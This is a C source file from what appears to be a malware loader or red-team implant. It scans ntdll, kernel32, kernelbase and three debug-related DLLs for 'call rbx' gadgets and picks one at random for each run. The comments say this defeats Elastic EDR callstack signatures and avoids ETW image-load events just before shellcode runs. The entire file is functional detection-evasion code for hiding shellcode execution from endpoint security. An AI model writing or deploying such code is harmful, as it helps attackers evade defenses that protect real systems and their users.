// =============================================
// Gadgets.c - Call-gadget discovery and selection
// =============================================
//
// SpoofCallback picks one per-run via RDTSC so the
// return address injected into the call stack is not
// the same bytes of ntdll every execution; this
// defeats EDR rules that flag "single return-address
// frequency" (Elastic 8.11+ callstack heuristics).
//
// Register is still rbx only — SpoofCallback's asm
// stub is hard-wired to `mov rbx, target; jmp gadget`.
// =============================================

#include "Common.h"

static GADGET_POOL g_CallGadgetPool = { 0 };

// `call rbx` pattern.
static const BYTE g_CallRbxPattern[] = { 0xFF, 0xD3 };

// Populate the pool from ntdll / kernel32 / kernelbase, plus three less-
// canonical modules (dsdmo / dbgcore / dbghelp) which Almond Offensive Security
// 2025-11 demonstrated are unexpected by Elastic 9.x callstack signatures (which
// model gadget origins as primarily ntdll/kernel32/kernelbase). Adding "weird"
// gadget sources breaks return-address frequency baselines without changing
// the legitimacy of any individual frame — all six DLLs are signed Microsoft
// binaries loaded in most processes.
BOOL CollectCallGadgets(VOID) {

    g_CallGadgetPool.dwCount = 0;
    GadgetPoolScanModule(&g_CallGadgetPool, FindLoadedModuleW(L"NTDLL.DLL"),       g_CallRbxPattern, sizeof(g_CallRbxPattern));
    GadgetPoolScanModule(&g_CallGadgetPool, FindLoadedModuleW(L"KERNEL32.DLL"),    g_CallRbxPattern, sizeof(g_CallRbxPattern));
    GadgetPoolScanModule(&g_CallGadgetPool, FindLoadedModuleW(L"KERNELBASE.DLL"),  g_CallRbxPattern, sizeof(g_CallRbxPattern));
    // Non-canonical modules — opportunistically scan if already loaded; silent
    // no-op otherwise (FindLoadedModuleW returns NULL). Don't LoadLibrary them
    // explicitly: that would create an image-load ETW event for a debug DLL
    // immediately before shellcode execution, which is its own anomaly.
    GadgetPoolScanModule(&g_CallGadgetPool, FindLoadedModuleW(L"DBGCORE.DLL"),     g_CallRbxPattern, sizeof(g_CallRbxPattern));
    GadgetPoolScanModule(&g_CallGadgetPool, FindLoadedModuleW(L"DBGHELP.DLL"),     g_CallRbxPattern, sizeof(g_CallRbxPattern));
    GadgetPoolScanModule(&g_CallGadgetPool, FindLoadedModuleW(L"DSDMO.DLL"),       g_CallRbxPattern, sizeof(g_CallRbxPattern));
    return g_CallGadgetPool.dwCount > 0;
}

PVOID GetRandomCallGadget(VOID) {
    return GadgetPoolRandom(&g_CallGadgetPool);
}
